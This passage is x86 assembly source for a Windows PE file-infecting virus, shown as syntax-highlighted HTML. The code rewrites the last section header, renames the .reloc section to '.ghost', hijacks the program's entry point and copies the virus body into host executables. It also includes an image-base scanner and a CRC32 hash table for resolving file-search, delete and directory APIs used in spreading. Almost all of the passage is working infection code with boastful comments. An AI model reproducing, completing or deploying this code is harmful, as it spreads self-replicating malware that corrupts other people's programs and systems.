    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; ESI = Last section header</span><span class="sc0">
                                                </span><span class="sc1">; EDI = PE header</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">0A0000020h</span><span class="sc0">            </span><span class="sc1">; New section attributes</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0A0h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; Nulify fixups</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0A4h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"ler."</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">RelocNotLast</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc3">"co"</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">RelocNotLast</span><span class="sc0">

</span><span class="sc1">; Overwriting stage, .reloc is last section</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"ohg."</span><span class="sc0">          </span><span class="sc1">; Set new section name to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc3">"ts"</span><span class="sc0">          </span><span class="sc1">; ".ghost"</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Clear PointerToRelocations</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; Clear NumberOfRelocations</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Where copy virus</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; VirtualSize -&gt; virus size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; ECX = Alignment</span><span class="sc0">

        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">; Align, sucker</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; SizeOfRawData -&gt; aligned</span><span class="sc0">
                                                </span><span class="sc1">;                  virus size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Fix ImageSize to allow it</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; to work in NT :P</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; New EIP</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Put new EIP and get old one</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Save it</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EDX = Where truncate</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">; Align, sucker</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EDX</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">copy_virus</span><span class="sc0">

</span><span class="sc1">; Normal stage, .reloc not last or not present</span><span class="sc0">

</span><span class="sc5">RelocNotLast</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Put new EIP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">; Align, sucker</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">copy_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Copy fixed part of virus</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">virus_size</span><span class="sc4">-(</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">swap_routines</span><span class="sc4">))</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">swapped_blocks_mem</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Copy swapped part</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">end_swap_routines</span><span class="sc4">-</span><span class="sc5">swap_routines</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_rit_mem</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Copy new RIT</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">n_routines</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc5">Trunc</span><span class="sc4">&amp;</span><span class="sc5">UnMap</span><span class="sc4">&amp;</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectPE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">SetEndOfFile</span><span class="sc0">

</span><span class="sc5">UnMap</span><span class="sc4">&amp;</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectPE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectPE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">CloseFileExitInfectPE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">ExitInfectPE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndInfectPE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc1">; | Miscellaneous routines                                                  |</span><span class="sc0">
</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">

</span><span class="sc5">CheckImageBase_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI - Address inside module</span><span class="sc0">
</span><span class="sc1">;       ECX - Limit</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       ESI - module address</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ItWasKewlEnough</span><span class="sc0">
</span><span class="sc5">NotCoolAddress</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00010000h</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">CheckImageBase_</span><span class="sc0">
</span><span class="sc5">ItWasKewlEnough</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndCheckImageBase</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">CRC32_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI - Pointer to the code to process</span><span class="sc0">
</span><span class="sc1">;       EDI - Size of such code</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX - CRC32 of that code</span><span class="sc0">

    </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Optimized by me - 2 bytes</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; less</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">NoCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">
</span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextBitCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Another fool byte less</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextByteCRC</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; Another byte less</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndCRC32</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc1">; | APICRC32 engine                                                         |</span><span class="sc0">
</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">

</span><span class="sc1">; The pseudo-structure for the APICRC32 engine is the following:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       * ASCIIz String of the library (not needed for KERNEL32)</span><span class="sc0">
</span><span class="sc1">;       * CRC32 of APIs we need</span><span class="sc0">
</span><span class="sc1">;       * BB byte (for signalize the end of exports needed of that function)</span><span class="sc0">
</span><span class="sc1">;       * ... (repeat the above points the times you need-&gt;libraries u use)</span><span class="sc0">
</span><span class="sc1">;       * "" byte (for signalize the definitive end of imports)</span><span class="sc0">

</span><span class="sc5">GetAPIs_</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">oAPI</span><span class="sc0">

</span><span class="sc5">@FindFirstFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0AE17EBEFh</span><span class="sc0">
</span><span class="sc5">@FindNextFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0AA700106h</span><span class="sc0">
</span><span class="sc5">@FindClose</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0C200BE21h</span><span class="sc0">
</span><span class="sc5">@CreateFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">08C892DDFh</span><span class="sc0">
</span><span class="sc5">@DeleteFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0DE256FDEh</span><span class="sc0">
</span><span class="sc5">@SetFilePointer</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">085859D42h</span><span class="sc0">
</span><span class="sc5">@SetFileAttributesA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">03C19E536h</span><span class="sc0">
</span><span class="sc5">@CloseHandle</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">068624A9Dh</span><span class="sc0">
</span><span class="sc5">@GetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0EBC6C18Bh</span><span class="sc0">
</span><span class="sc5">@SetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0B2DBD7DCh</span><span class="sc0">
</span><span class="sc5">@GetWindowsDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0FE248274h</span><span class="sc0">
